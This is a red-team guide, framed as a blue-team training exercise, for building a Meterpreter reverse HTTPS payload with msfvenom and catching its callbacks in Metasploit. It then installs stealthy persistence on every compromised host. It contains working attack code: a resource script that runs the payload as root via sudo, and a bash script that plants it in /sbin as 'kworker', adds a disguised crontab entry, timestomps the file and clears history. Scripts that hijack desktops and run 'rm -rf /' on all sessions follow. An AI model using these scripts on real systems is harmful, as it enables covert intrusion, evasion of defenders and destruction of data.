# Guide   

This is a guide to setting up a reverse shell and gaining persistance in the environment. 

## Senario

We will create a payload that will be ran on the blue team training environment 45 minutes after the blue team powers on and starts hardening their network. Our goal will be to stealthly persist as many systems as possilble day one. Day two if we have any persistance we will start to do things to alert the blue team of your presence. EX: Change background, delete firewall rules and remove files.

### Hints   

Linux 64x   
firewall is up but systems require 80,443,53 outbound


## Creating your Payload

There is many ways to create a payload but one of the easiest is using msfvenom.  
To find a payload to use you can list all payloads with `msfvenom -l payloads`   
We can further filter this down to fit our requirements by piping this to grep   

```console
root@kali:~# msfvenom -l payloads | grep linux/x64
    linux/x64/exec                                      Execute an arbitrary command                               
    linux/x64/meterpreter/bind_tcp                      Inject the mettle server payload (staged). Listen for a connection
    linux/x64/meterpreter/reverse_tcp                   Inject the mettle server payload (staged). Connect back to the attacker
    linux/x64/meterpreter_reverse_http                  Run the Meterpreter / Mettle server payload (stageless)    
    linux/x64/meterpreter_reverse_https                 Run the Meterpreter / Mettle server payload (stageless)    
    linux/x64/meterpreter_reverse_tcp                   Run the Meterpreter / Mettle server payload (stageless)    
    linux/x64/pingback_bind_tcp                         Accept a connection from attacker and report UUID (Linux x64)
    linux/x64/pingback_reverse_tcp                      Connect back to attacker and report UUID (Linux x64)       
    linux/x64/shell/bind_tcp                            Spawn a command shell (staged). Listen for a connection    
    linux/x64/shell/reverse_tcp                         Spawn a command shell (staged). Connect back to the attacker
    linux/x64/shell_bind_ipv6_tcp                       Listen for an IPv6 connection and spawn a command shell    
    linux/x64/shell_bind_tcp                            Listen for a connection and spawn a command shell          
    linux/x64/shell_bind_tcp_random_port                Listen for a connection in a random port and spawn a command shell. Use nmap to discover the open port: 'nmap -sS target -p-'.                                                                 
    linux/x64/shell_find_port                           Spawn a shell on an established connection                 
    linux/x64/shell_reverse_ipv6_tcp                    Connect back to attacker and spawn a command shell over IPv6
    linux/x64/shell_reverse_tcp                         Connect back to attacker and spawn a command shell
```    

From this we can see that `linux/x64/meterpreter_reverse_https` would be a good payload to use.   

To see the options you run   
```console
root@kali:~# msfvenom -p linux/x64/meterpreter_reverse_https --list-options
Options for payload/linux/x64/meterpreter_reverse_https:                                                           
=========================                                                                                          
                                                                                                                   
                                                                                                                   
       Name: Linux Meterpreter, Reverse HTTPS Inline                                                               
     Module: payload/linux/x64/meterpreter_reverse_https                                                           
   Platform: Linux                                                                                                 
       Arch: x64
Needs Admin: No
 Total size: 1046512
       Rank: Normal

Provided by:
    Adam Cammack <adam_cammack@rapid7.com>
    Brent Cook <brent_cook@rapid7.com>
    timwr

Basic options:
Name   Current Setting  Required  Description
----   ---------------  --------  -----------
LHOST                   yes       The local listener hostname
LPORT  8443             yes       The local listener port
LURI                    no        The HTTP Path

Description:
  Run the Meterpreter / Mettle server payload (stageless)



Advanced options for payload/linux/x64/meterpreter_reverse_https:
=========================

    Name                         Current Setting                                                Required  Description
    ----                         ---------------                                                --------  -----------
    AutoLoadStdapi               true                                                           yes       Automatically load the Stdapi extension
    AutoRunScript                                                                               no        A script to run automatically on session creation.
    AutoSystemInfo               true                                                           yes       Automatically capture system information on initialization.
    AutoUnhookProcess            false                                                          yes       Automatically load the unhook extension and unhook the process
    AutoVerifySession            true                                                           yes       Automatically verify and drop invalid sessions
    AutoVerifySessionTimeout     30                                                             no        Timeout period to wait for session validation to occur, in seconds
    EnableUnicodeEncoding        false                                                          yes       Automatically encode UTF-8 strings as hexadecimal
    HandlerSSLCert                                                                              no        Path to a SSL certificate in unified PEM format, ignored for HTTP transports
    HttpServerName               Apache                                                         no        The server header that the handler will send in response to requests
    HttpUnknownRequestResponse   <html><body><h1>It works!</h1></body></html>                   no        The returned HTML response body when the handler receives a request that is not from a payload
    HttpUserAgent                Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko  no        The user-agent that the payload should use for communication
    IgnoreUnknownPayloads        false                                                          yes       Whether to drop connections from payloads using unknown UUIDs
    InitialAutoRunScript                                                                        no        An initial script to run on session creation (before AutoRunScript)
    OverrideLHOST                                                                               no        When OverrideRequestHost is set, use this value as the host name for secondary requests
    OverrideLPORT                                                                               no        When OverrideRequestHost is set, use this value as the port number for secondary requests
    OverrideRequestHost          false                                                          yes       Forces a specific host and port instead of using what the client requests, defaults to LHOST:LPORT
    OverrideScheme                                                                              no        When OverrideRequestHost is set, use this value as the scheme for secondary requests, e.g http or https
    PayloadProcessCommandLine                                                                   no        The displayed command line that will be used by the payload
    PayloadUUIDName                                                                             no        A human-friendly name to reference this unique payload (requires tracking)
    PayloadUUIDRaw                                                                              no        A hex string representing the raw 8-byte PUID value for the UUID
    PayloadUUIDSeed                                                                             no        A string to use when generating the payload UUID (deterministic)
    PayloadUUIDTracking          false                                                          yes       Whether or not to automatically register generated UUIDs
    PingbackRetries              0                                                              yes       How many additional successful pingbacks
    PingbackSleep                30                                                             yes       Time (in seconds) to sleep between pingbacks
    ReverseAllowProxy            false                                                          yes       Allow reverse tcp even with Proxies specified. Connect back will NOT go through proxy but directly to LHOST
    ReverseListenerBindAddress                                                                  no        The specific IP address to bind to on the local system
    ReverseListenerBindPort                                                                     no        The port to bind to on the local system if different from LPORT
    SessionCommunicationTimeout  300                                                            no        The number of seconds of no activity before this session should be killed
    SessionExpirationTimeout     604800                                                         no        The number of seconds before this session should be forcibly shut down
    SessionRetryTotal            3600                                                           no        Number of seconds try reconnecting for on network failure
    SessionRetryWait             10                                                             no        Number of seconds to wait between reconnect attempts
    StagerVerifySSLCert          false                                                          no        Whether to verify the SSL certificate in Meterpreter
    VERBOSE                      false                                                          no        Enable detailed status messages
    WORKSPACE                                                                                   no        Specify the workspace for this module

Evasion options for payload/linux/x64/meterpreter_reverse_https:
=========================

    Name  Current Setting  Required  Description
    ----  ---------------  --------  -----------
```

You can see that the Basic options of LHOST and LPORT are required, to input these options you put the variables in after the the payload before the next argument.   
`msfvenom -p linux/x64/meterpreter_reverse_https LPORT=443 LHOST=10.0.0.1`   

After this you other options that can be important are:   
```
--arch              # Set Architecture    
--platform          # Set Platform   
-f                  # Set Format   
-e                  # Set Encoders   
-o                  # Set Outfile   
```
All of these options can be used with --list to show valid options.   

For our Senario -f elf will work.

The final command should look as follows:   
```console
root@kali:~# msfvenom -p linux/x64/meterpreter_reverse_https LPORT=443 LHOST=10.0.0.1 -f elf -o reverse_shell
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 1046512 bytes
Final size of elf file: 1046512 bytes
Saved as: reverse_shell
```


## Receiving our Callback

To receive our callback we will use metasploit, to start we metasploit we run msfconsole.

```console
root@kali:~# msfconsole
                          ########                  #
                      #################            #
                   ######################         #
                  #########################      #
                ############################
               ##############################
               ###############################
              ###############################
              ##############################
                              #    ########   #
                 ##        ###        ####   ##
                                      ###   ###
                                    ####   ###
               ####          ##########   ####
               #######################   ####
                 ####################   ####
                  ##################  ####
                    ############      ##
                       ########        ###
                      #########        #####
                    ############      ######
                   ########      #########
                     #####       ########
                       ###       #########
                      ######    ############
                     #######################
                     #   #   ###  #   #   ##
                     ########################
                      ##     ##   ##     ##
                            https://metasploit.com


       =[ metasploit v5.0.67-dev                          ]
+ -- --=[ 1957 exploits - 1093 auxiliary - 336 post       ]
+ -- --=[ 558 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 7 evasion                                       ]

msf5 > 
```

The module we will use is called the multi/handler.  This is a module that is used to receive any callbacks.  Then set the payload to match our payload.

```console
msf5 > use multi/handler
msf5 exploit(multi/handler) > set payload linux/x64/meterpreter_reverse_https
payload => linux/x64/meterpreter_reverse_https
msf5 exploit(multi/handler) > options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (linux/x64/meterpreter_reverse_https):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The local listener hostname
   LPORT  8443             yes       The local listener port
   LURI                    no        The HTTP Path


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target

```

Then set the LHOST and LPORT.  This would normally be enought to receive the callback however in this senario we will be getting multiple callbacks.  To fix this we will need to change the advanced setting ExitOnSession to false and run the handler as a job.

```console
msf5 exploit(multi/handler) > run -j
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.

[*] Started HTTPS reverse handler on https://0.0.0.0:443
msf5 exploit(multi/handler) > jobs


Jobs
====

  Id  Name                    Payload                              Payload opts
  --  ----                    -------                              ------------
  0   Exploit: multi/handler  linux/x64/meterpreter_reverse_https  https://10.0.0.1:443
```

This will allow metasploit to catch meterpreter shells untill the job is killed.

## Gaining Persistence

We can start by searching all the metasploit modules for persistence with the search command.

```console
msf5 > search persistence

Matching Modules
================

   #   Name                                                  Disclosure Date  Rank       Check  Description
   -   ----                                                  ---------------  ----       -----  -----------
   0   auxiliary/server/regsvr32_command_delivery_server                      normal     No     Regsvr32.exe (.sct) Command Delivery Server
   1   exploit/linux/local/apt_package_manager_persistence   1999-03-09       excellent  No     APT Package Manager Persistence
   2   exploit/linux/local/autostart_persistence             2006-02-13       excellent  No     Autostart Desktop Item Persistence
   3   exploit/linux/local/bash_profile_persistence          1989-06-08       normal     No     Bash Profile Persistence
   4   exploit/linux/local/cron_persistence                  1979-07-01       excellent  No     Cron Persistence
   5   exploit/linux/local/rc_local_persistence              1980-10-01       excellent  No     rc.local Persistence
   6   exploit/linux/local/service_persistence               1983-01-01       excellent  No     Service Persistence
   7   exploit/linux/local/yum_package_manager_persistence   2003-12-17       excellent  No     Yum Package Manager Persistence
   8   exploit/osx/local/persistence                         2012-04-01       excellent  No     Mac OS X Persistent Payload Installer
   9   exploit/osx/local/sudo_password_bypass                2013-02-28       normal     Yes    Mac OS X Sudo Password Bypass
   10  exploit/unix/local/at_persistence                     1997-01-01       excellent  Yes    at(1) Persistence
   11  exploit/windows/local/persistence                     2011-10-19       excellent  No     Windows Persistent Registry Startup Payload Installer
   12  exploit/windows/local/persistence_image_exec_options  2008-06-28       excellent  No     Windows Silent Process Exit Persistence
   13  exploit/windows/local/persistence_service             2018-10-20       excellent  No     Windows Persistent Service Installer
   14  exploit/windows/local/ps_wmi_exec                     2012-08-19       excellent  No     Authenticated WMI Exec via Powershell
   15  exploit/windows/local/registry_persistence            2015-07-01       excellent  Yes    Windows Registry Only Persistence
   16  exploit/windows/local/s4u_persistence                 2013-01-02       excellent  No     Windows Manage User Level Persistent Payload Installer
   17  exploit/windows/local/vss_persistence                 2011-10-21       excellent  No     Persistent Payload in Windows Volume Shadow Copy
   18  exploit/windows/local/wmi_persistence                 2017-06-06       normal     No     WMI Event Subscription Persistence
   19  exploit/windows/smb/psexec_psh                        1999-01-01       manual     No     Microsoft Windows Authenticated Powershell Command Execution
   20  post/linux/manage/sshkey_persistence                                   excellent  No     SSH Key Persistence
   21  post/windows/gather/enum_ad_managedby_groups                           normal     No     Windows Gather Active Directory Managed Groups
   22  post/windows/manage/persistence_exe                                    normal     No     Windows Manage Persistent EXE Payload Installer 
```

We can filter this down with by specifying the platform we are looking for.

```console
msf5 > search platform linux -S persistence

Matching Modules
================

   #    Name                                                                      Disclosure Date  Rank       Check  Description
   -    ----                                                                      ---------------  ----       -----  -----------
   227  exploit/linux/local/apt_package_manager_persistence                       1999-03-09       excellent  No     APT Package Manager Persistence
   229  exploit/linux/local/autostart_persistence                                 2006-02-13       excellent  No     Autostart Desktop Item Persistence
   230  exploit/linux/local/bash_profile_persistence                              1989-06-08       normal     No     Bash Profile Persistence
   235  exploit/linux/local/cron_persistence                                      1979-07-01       excellent  No     Cron Persistence
   257  exploit/linux/local/rc_local_persistence                                  1980-10-01       excellent  No     rc.local Persistence
   261  exploit/linux/local/service_persistence                                   1983-01-01       excellent  No     Service Persistence
   271  exploit/linux/local/yum_package_manager_persistence                       2003-12-17       excellent  No     Yum Package Manager Persistence
   674  post/linux/manage/sshkey_persistence                                                       excellent  No     SSH Key Persistence
   ```

This will leave us with 8 possible methods for gaining persistence on our targets. We will want to view each of these to see what method to use.  This can be done with the info commands.   

```console
msf5 > info exploit/linux/local/cron_persistence

       Name: Cron Persistence
     Module: exploit/linux/local/cron_persistence
   Platform: Unix, Linux
       Arch: cmd
 Privileged: No
    License: Metasploit Framework License (BSD)
       Rank: Excellent
  Disclosed: 1979-07-01

Provided by:
  h00die <mike@shorebreaksecurity.com>

Available targets:
  Id  Name
  --  ----
  0   Cron
  1   User Crontab
  2   System Crontab

Check supported:
  No

Basic options:
  Name      Current Setting  Required  Description
  ----      ---------------  --------  -----------
  CLEANUP   true             yes       delete cron entry after execution
  SESSION                    yes       The session to run this module on.
  TIMING    * * * * *        no        cron timing.  Changing will require WfsDelay to be adjusted
  USERNAME  root             no        User to run cron/crontab as

Payload information:
  Avoid: 4 characters

Description:
  This module will create a cron or crontab entry to execute a 
  payload. The module includes the ability to automatically clean up 
  those entries to prevent multiple executions. syslog will get a copy 
  of the cron entry.
  ```
  
  We decided to use this module during testing.  We found that it worked however it was very easy to notice that there was an adversary on the box and where to find the persistance.  Instead we decided to use a custom exploit based on this module.
  
To do that we created a resource file for metasploit that will upload a payload and execute it.

#### resource file    
uploadandrun.rc   
```ruby
<ruby>
framework.sessions.each do |num,session|
print_status("Uploading file to session #{num}")
session.fs.file.upload_file("/tmp/AutoPWN","AutoPWN")
print_status("Uploaded, Executing AutoPWN")
session.sys.process.execute("/bin/bash", "-c 'chmod +x /tmp/AutoPWN && echo \"password!\" | sudo -S bash -c \"/tmp/AutoPWN\"'", {'Hidden' => true, 'Channelized' => false})
print_status("Successful AutoPWN on session #{num}")
end
</ruby>
```

This file will upload the file AutoPWN to the tmp directory on each of the sessions that are currently open.  Then it will make the file executable and execute the file with root.

#### payload file    
AutoPWN    
```bash
#!/bin/bash
find / -name kworker -exec cp -t /sbin/ {} +
echo " " >> /etc/crontab
echo "#Required for Kryptos Operations" >> /etc/crontab
echo "0,30 * * * * root kworker" >> /etc/crontab
touch -r /sbin/route /sbin/kworker
rm /tmp/AutoPWN
history -c
sleep 60 && kworker
```

This payload will find the meterpreter payload that I created and copy it to /sbin/.  Then it will write into the crontab the job to run my payload ever 30 min.  It also put in a note about how it is required so the blue team might look over it.  Then it will change the file modification date with the touch command so the exploit will have the same date as route.  This will make it harder to find.  Finally it will clean up the payload file, clear history and launch the meterpreter payload as root.

![alt text](https://github.com/vipertooth/Notes/blob/master/Lab1/Pictures/runandexecute.png)
![alt text](https://github.com/vipertooth/Notes/blob/master/Lab1/Pictures/newsessions.png)


## Disruption   

To dirupt the blue team we changed the background and played music.

To change the background we ran a resource file:   
mass-background-change.rc   
```ruby
<ruby>
framework.sessions.each do |num,session|
print_status("Uploading Image to session #{num}")
session.fs.file.upload_file("/tmp/.Flag.jpg","Flag.jpg")
print_status("Uploaded, Changing Background")
session.sys.process.execute("/bin/bash", "-c 'gsettings set org.gnome.desktop.background picture-uri file:///tmp/.Flag.jpg'", {'Hidden' => true, 'Channelized' => false})
print_status("Successfully changed Background on session #{num}")
end
</ruby>
```

To play music again we ran a resource file:   
mass-audio-rickroll.rc   
```ruby
<ruby>
framework.sessions.each do |num,session|
print_status("Uploading Image to session #{num}")
session.fs.file.upload_file("/tmp/rick.wav","rick.wav")
print_status("Uploaded")
session.sys.process.execute("/bin/bash", "-c 'amixer set "Master" 100%'", {'Hidden' => true, 'Channelized' => false})
print_status("Set volume to max")
session.sys.process.execute("/bin/bash", "-c 'aplay /tmp/rick.wav'", {'Hidden' => true, 'Channelized' => false})
print_status("Rick Rolling session #{num}")
end
</ruby>
```

## Destruction

To destroy all remaining systems we can run a resource file:   
mass-destruction.rc  
```ruby
<ruby>
framework.sessions.each do |num,session|
session.sys.process.execute("/bin/bash", "-c 'rm -rf /'", {'Hidden' => true, 'Channelized' => false})
print_status("Destroying session #{num})
end
</ruby>
```

  



